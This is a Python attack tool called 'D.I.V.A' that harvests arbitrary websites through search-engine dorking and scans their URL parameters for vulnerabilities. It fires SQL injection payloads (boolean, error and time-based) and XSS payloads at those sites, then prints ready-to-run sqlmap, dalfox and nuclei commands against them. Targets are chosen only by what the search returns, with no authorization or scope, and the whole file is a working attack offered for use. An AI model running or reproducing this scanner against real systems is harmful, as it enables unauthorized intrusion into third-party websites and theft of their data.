#!/usr/bin/env python3
# Dorking Intelligence & Vulnerability Arsenal (D.I.V.A)

import requests
import sys
import urllib.parse
import argparse
from ddgs import DDGS
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
import time
import random
import re

class Colors:
    PURPLE = "\033[95m"
    CYAN = "\033[96m"
    BLUE = "\033[94m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    RESET = "\033[0m"
    BOLD = "\033[1m"

# --- Banner ---
def print_banner():
    print(f"""{Colors.RED}{Colors.BOLD}
   =================================================
      Dorking Intelligence & Vulnerability Arsenal
                   (D.I.V.A) v6.0
            | KILLING IN THE NAME VERSION|
                 - Tool by Copykopi -
   ================================================={Colors.RESET}
    """)

SQLI_PAYLOAD_ARSENAL = {
    'Boolean': ["' OR 1=1 -- ", "' OR '1'='1' -- ", "') OR ('1'='1"],
    'Error': ["'", "\"", "`", "')", "\")", "`)"],
    'Time': ["' AND (SELECT 42 FROM (SELECT(SLEEP(5)))a)-- ", "';WAITFOR DELAY '0:0:5'--"]
}
SQLI_TIME_DELAY = 5 # detik

XSS_PAYLOAD_ARSENAL = [
    "<script>alert('XSS')</script>",
    "'\"><img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "javascript:alert('XSS')//",
    "<details/open/ontoggle=alert('XSS')>"
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
]
EXCLUDED_DOMAINS = ["youtube.com", "facebook.com", "twitter.com", "linkedin.com", "github.com"]
EXCLUDED_EXTENSIONS = [".pdf", ".jpg", ".jpeg", ".png", ".gif", ".docx", ".txt", ".css"]

def perform_dorking(query, max_results):
    print(f"{Colors.CYAN}[*] Performing dorking for query: '{query}'{Colors.RESET}")
    urls = set()
    try:
        with DDGS() as ddgs:
            results = list(ddgs.text(query, max_results=max_results))
            for r in tqdm(results, desc="Processing Dorks", unit=" results"):
                url = r.get("href")
                if url: urls.add(url)
    except Exception as e:
        print(f"{Colors.RED}[!] An error occurred during dorking: {e}{Colors.RESET}")
    print(f"{Colors.GREEN}[+] Dorking found {len(urls)} unique URLs.{Colors.RESET}")
    print(f"{Colors.CYAN}[*] Filtering irrelevant URLs...{Colors.RESET}")
    filtered_urls = [
        url for url in urls
        if not any(domain in url for domain in EXCLUDED_DOMAINS)
        and not any(url.lower().endswith(ext) for ext in EXCLUDED_EXTENSIONS)
        and urllib.parse.urlparse(url).query != ''
    ]
    print(f"{Colors.GREEN}[+] Filtering complete. Proceeding with {len(filtered_urls)} potentially vulnerable URLs.{Colors.RESET}\n")
    return filtered_urls

def scan_url(url, session):
    findings = []
    headers = {'User-Agent': random.choice(USER_AGENTS)}
    try:
        r_normal = session.get(url, headers=headers, timeout=10)
        normal_len = len(r_normal.text)

        parsed_url = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed_url.query)

        for param in params:
            original_value = params[param][0] if params[param] else ""
            
            sqli_found = False
            for category, payloads in SQLI_PAYLOAD_ARSENAL.items():
                if sqli_found: break
                for payload in payloads:
                    modified_params = params.copy(); modified_params[param] = original_value + payload
                    test_url = parsed_url._replace(query=urllib.parse.urlencode(modified_params, doseq=True)).geturl()
                    
                    if category == 'Error':
                        r = session.get(test_url, headers=headers, timeout=10)
                        if re.search(r"sql|syntax|mysql|unclosed|quoted|odbc", r.text, re.I):
                            findings.append({'type': 'Error-Based SQLi', 'url': test_url, 'payload': payload}); sqli_found = True; break
                    
                    elif category == 'Boolean':
                        r = session.get(test_url, headers=headers, timeout=10)
                        if abs(len(r.text) - normal_len) > (normal_len * 0.2) and normal_len > 0:
                            findings.append({'type': 'Boolean-Based SQLi', 'url': test_url, 'payload': payload}); sqli_found = True; break
                            
                    elif category == 'Time':
                        start_time = time.time()
                        try:
                            session.get(test_url, headers=headers, timeout=SQLI_TIME_DELAY + 5)
                        except requests.exceptions.ReadTimeout:
                            findings.append({'type': 'Time-Based SQLi', 'url': test_url, 'payload': payload}); sqli_found = True; break
                        if (time.time() - start_time) >= SQLI_TIME_DELAY:
                            findings.append({'type': 'Time-Based SQLi', 'url': test_url, 'payload': payload}); sqli_found = True; break
            
            xss_found = False
            for payload in XSS_PAYLOAD_ARSENAL:
                if xss_found: break
                modified_params = params.copy(); modified_params[param] = payload
                test_url = parsed_url._replace(query=urllib.parse.urlencode(modified_params, doseq=True)).geturl()
                r = session.get(test_url, headers=headers, timeout=10)
                if payload in r.text:
                    findings.append({'type': 'XSS', 'base_url': url, 'param': param, 'test_url': test_url, 'payload': payload}); xss_found = True; break

    except requests.exceptions.RequestException: pass
    return findings

def generate_followup_commands(all_findings):
    if not all_findings: return
    
    nuclei_urls = sorted(list(set(f.get('base_url') or f.get('url') for f in all_findings)))
    sqli_leads = [f for f in all_findings if 'SQLi' in f['type']]
    xss_leads = [f for f in all_findings if f['type'] == 'XSS']

    print(f"\n\n{Colors.BLUE}{Colors.BOLD}--- [ FOLLOW-UP ARSENAL ] ---{Colors.RESET}")
    print(f"{Colors.YELLOW}Copy-paste commands below to run heavier scans on potential targets:{Colors.RESET}")
    if xss_leads:
        print(f"\n{Colors.RED}{Colors.BOLD}# Dalfox Commands (for advanced XSS){Colors.RESET}")
        for lead in xss_leads: print(f"dalfox url \"{lead['base_url']}\" -p {lead['param']} --skip-bav --silence")
    if sqli_leads:
        print(f"\n{Colors.CYAN}{Colors.BOLD}# SQLMap Commands (for SQLi){Colors.RESET}")
        for lead in sqli_leads: print(f"sqlmap -u \"{lead['url']}\" --batch --random-agent --level=5 --risk=3")
    if nuclei_urls:
        print(f"\n{Colors.CYAN}{Colors.BOLD}# Nuclei Commands (for broad scanning){Colors.RESET}")
        for url in nuclei_urls:
            base_url = urllib.parse.urlunparse(urllib.parse.urlparse(url)._replace(query='', fragment=''))
            print(f"nuclei -u {base_url} -etags cve,misc,config -severity critical,high,medium")

def save_results(filename, all_urls, all_findings):
    try:
        with open(filename, "w") as f:
            f.write("=== Dorking Results (Filtered) ===\n")
            for url in all_urls: f.write(url + "\n")
            f.write("\n\n=== POTENTIAL VULNERABILITIES (Initial Scan) ===\n")
            if not all_findings: f.write("No direct vulnerabilities found by D.I.V.A's initial scan.\n")
            else:
                for find in all_findings:
                    f.write(f"[POTENTIAL {find['type']}] on param '{find.get('param', 'N/A')}' with payload '{find['payload']}' -> {find.get('test_url') or find.get('url')}\n")
            
            f.write(f"\n\n--- [ FOLLOW-UP ARSENAL ] ---\n")
           
    except IOError as e: print(f"\n{Colors.RED}[!] Error saving results to file: {e}{Colors.RESET}")

def main():
    print_banner()
    parser = argparse.ArgumentParser(
        description="D.I.V.A v6.0 - A tool for intelligent dorking and vulnerability orchestration.",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=f"""Example Usage:
  {sys.argv[0]} -q "inurl:product.php?id=" -n 200 -t 25 -o report.txt"""
    )
    parser.add_argument("-q", "--query", required=True, help="[REQUIRED] The dorking query to search for.")
    parser.add_argument("-n", "--num-results", type=int, default=100, help="Number of dorking results to fetch. (default: 100)")
    parser.add_argument("-t", "--threads", type=int, default=20, help="Number of threads for concurrent scanning. (default: 20)")
    parser.add_argument("-o", "--output", help="Output file to save all results and commands.")
    args = parser.parse_args()

    urls_to_scan = perform_dorking(args.query, args.num_results)
    if not urls_to_scan: sys.exit(0)

    print(f"{Colors.CYAN}[*] Starting initial vulnerability scan on {len(urls_to_scan)} URLs with {args.threads} threads...{Colors.RESET}")
    all_findings = []
    with requests.Session() as session:
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            future_to_url = {executor.submit(scan_url, url, session): url for url in urls_to_scan}
            for future in tqdm(as_completed(future_to_url), total=len(urls_to_scan), desc="Scanning", unit=" URL"):
                try:
                    results = future.result()
                    if results:
                        for find in results:
                            all_findings.append(find)
                            print(f"{Colors.RED}{Colors.BOLD}[FOUND] [{find['type']}] Potential vuln at {find.get('test_url') or find.get('url')}{Colors.RESET}")
                except Exception: pass
    print(f"\n{Colors.GREEN}[+] Initial scan finished. Found {len(all_findings)} potential issues.{Colors.RESET}")
    generate_followup_commands(all_findings)
    if args.output: save_results(args.output, urls_to_scan, all_findings)
    print(f"\n{Colors.YELLOW}{Colors.BOLD}Happy hunting! Always test responsibly.{Colors.RESET}")

if __name__ == "__main__":
    main()
